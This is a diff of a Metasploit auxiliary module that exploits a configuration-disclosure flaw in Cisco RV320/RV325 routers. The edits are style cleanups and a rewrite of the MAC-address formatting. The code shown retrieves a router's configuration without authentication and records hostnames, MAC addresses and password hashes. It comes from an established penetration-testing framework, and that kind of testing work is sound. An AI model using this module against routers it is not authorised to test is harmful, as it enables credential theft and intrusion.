@@ -11,7 +11,7 @@ class MetasploitModule < Msf::Auxiliary
       'Name'           => 'Cisco RV320/RV326 Configuration Disclosure',
       'Description'    => %q{
           A vulnerability in the web-based management interface of Cisco Small Business
-          RV320 and RV325 Dual Gigabit WAN VPN Routers could allow an unauthenticated,
+          RV320 and RV325 Dual Gigabit WAN VPN routers could allow an unauthenticated,
           remote attacker to retrieve sensitive information. The vulnerability is due
           to improper access controls for URLs. An attacker could exploit this
           vulnerability by connecting to an affected device via HTTP or HTTPS and
@@ -48,7 +48,7 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 
-  def report_cred(user,hash)
+  def report_cred(user, hash)
     service_data = {
       address: rhost,
       port: rport,
@@ -80,15 +80,14 @@ class MetasploitModule < Msf::Auxiliary
     print_good("Stored configuration (#{config.length} bytes) to #{stored_path}")
 
     # Report host information to database
-    mac = config.match(/^LANMAC=(.*)/)[1]
-    mac = "%s:%s:%s:%s:%s:%s" % [mac[0..1], mac[2..3], mac[4..5],
-                                 mac[6..7], mac[8..9], mac[10..11]]
     hostname = config.match(/^HOSTNAME=(.*)/)[1]
     model = config.match(/^MODEL=(.*)/)[1]
+    mac = config.match(/^LANMAC=(.*)/)[1]
+    mac = mac.scan(/\w{2}/).join(':')
     report_host(host: rhost,
                 mac: mac,
                 name: hostname,
-                os_name: "Cisco",
+                os_name: 'Cisco',
                 os_flavor: model)
 
     # Report password hashes to database
@@ -105,11 +104,11 @@ class MetasploitModule < Msf::Auxiliary
         'method'  => 'GET',
       }, 60)
     rescue OpenSSL::SSL::SSLError
-      fail_with(Failure::UnexpectedReply, "SSL handshake failed.  Consider setting 'SSL' to 'false' and trying again.")
+      fail_with(Failure::UnexpectedReply, 'SSL handshake failed.  Consider setting SSL to false and trying again.')
     end
 
     if res.nil?
-      fail_with(Failure::UnexpectedReply, "Empty response.  Please validate the RHOST and TARGETURI options and try again.")
+      fail_with(Failure::UnexpectedReply, 'Empty response.  Please validate the RHOST and TARGETURI options and try again.')
     elsif res.code != 200
       fail_with(Failure::UnexpectedReply, "Unexpected HTTP #{res.code} response.  Please validate the RHOST and TARGETURI options and try again.")
     end
@@ -118,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
     if body.match(/####sysconfig####/)
       parse_config(body)
     else body.include?"meta http-equiv=refresh content='0; url=/default.htm'"
-      fail_with(Failure::NotVulnerable, "Response suggests device is patched")
+      fail_with(Failure::NotVulnerable, 'Response suggests device is patched')
     end
   end
 end
